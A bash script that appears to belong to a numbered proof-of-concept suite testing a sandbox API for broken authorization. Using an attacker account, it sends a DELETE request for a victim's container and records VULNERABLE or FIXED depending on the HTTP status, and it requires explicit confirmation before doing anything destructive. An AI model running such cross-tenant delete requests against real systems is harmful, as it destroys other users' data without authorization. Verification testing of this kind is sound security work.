#!/usr/bin/env bash
# 08 — DESTRUCTIVE. Attacker deletes the victim's container.
# Vulnerable: 200 {"status":"ok"}
# Fixed:      404
#
# Only run this if you are willing to destroy the victim sandbox.
set -euo pipefail
# shellcheck source=_lib.sh
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_lib.sh"

banner "08  Attacker DELETES victim container (destructive)"
require_state attacker.json
require_state victim-container-name

victim_container="$(cat "${STATE_DIR}/victim-container-name")"

if [[ "${CONFIRM_DESTROY:-}" != "yes" ]]; then
  echo "Refusing to delete ${victim_container} without confirmation."
  echo
  echo "Re-run with:"
  echo "  CONFIRM_DESTROY=yes ./08-attacker-delete-container.sh"
  exit 1
fi

path="/api/sandbox/containers/${victim_container}"
body="$(api attacker DELETE "${path}")"
print_http
echo "${body}" | jq . 2>/dev/null || echo "${body}"
echo "${body}" > "${STATE_DIR}/attacker-delete.json"

http="$(last_http)"
echo
echo "  DELETE ${path}"

case "${http}" in
  200)
    verdict VULNERABLE "attacker deleted victim container ${victim_container}"
    ;;
  404)
    verdict FIXED "attacker could not delete victim container (HTTP 404)"
    ;;
  *)
    verdict INCONCLUSIVE "unexpected HTTP ${http} deleting victim container"
    exit 1
    ;;
esac

echo
echo "Done. Review .state/verdicts.log for the full chain."
